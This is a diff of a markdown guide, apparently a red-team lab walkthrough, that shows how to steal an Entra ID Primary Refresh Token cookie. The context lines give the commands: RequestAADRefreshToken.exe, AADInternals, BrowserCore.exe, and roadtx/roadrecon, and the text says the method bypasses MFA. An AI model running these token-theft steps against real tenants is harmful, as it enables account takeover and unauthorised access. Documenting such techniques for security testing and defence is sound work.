@@ -12,8 +12,6 @@ From this point on you act as the adversary, without knowing the Entra / AD Cred
 ## 1.Steal-the-PRT-Cookie 
 Note: This method will bypass MFA only if the user has authenticated using MFA in its Windows (open Edge and sync the profile, go to the windows account settings on Windows and make sure it doesn't need to get verified)
 
-![tokens](tools_diff.png)
-(reference: https://hybridbrothers.com/device-to-entraid/)
 #### Option 1: using RequestAADRefreshToken.exe tool
 Use the MicrosoftAccountTokenProvider DLL to request a new PRT cookie:
 Run RequestAADRefreshToken.exe from this folder, it will save the output on disk as well as print it to the console
@@ -49,9 +47,6 @@ Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
 ```
 
 
-
-
-
 ### Recon using roadrecon tool
 Use BrowserCore.exe to request a new PRT cookie with the current existing authentication context:
 ```powershell
@@ -72,7 +67,7 @@ roadtx browserprtauth --prt-cookie <cookie> -url
 # look at the access token
 type .roadtools_auth
 
-# search for the client_id here to see to what it has asked At for: https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/firstpartyscopes.json
+# bonus: search for the client_id here to see to what it has asked At for: https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/firstpartyscopes.json
 
 roadrecon gather
 
